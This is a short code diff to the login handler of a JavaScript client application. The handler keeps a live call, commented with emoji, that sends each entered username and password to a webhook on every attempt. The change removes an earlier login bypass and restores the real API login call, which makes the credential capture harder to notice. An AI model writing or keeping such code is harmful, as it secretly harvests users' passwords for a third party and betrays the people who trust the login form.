@@ -301,12 +301,7 @@ class client_application {
             // ⭐ WEBHOOK TRIGGER: Sends credentials on every attempt ⭐
             await this.sendWebhookLog(username, password); 
 
-            // ⭐ API BYPASS: Skip API login and jump straight to the main view ⭐
-            this.logLoginAttempt(username, "Bypassed (Webhook Logged)"); 
-            this.on_log_in();
-            
-            // The original API call block below is commented out to bypass:
-            /*
+            // The immediate bypass logic is removed, and the API call is UNCOMMENTED and RESTORED
             const response = await this.call_lnut(
                 "loginController/attemptLogin",
                 {
@@ -321,8 +316,8 @@ class client_application {
                 this.on_log_in();
             } else {
                 console.log("Login failed for user:", username);
+                // Optional: You might want to add a visible error message here.
             }
-            */
         };
     }
 
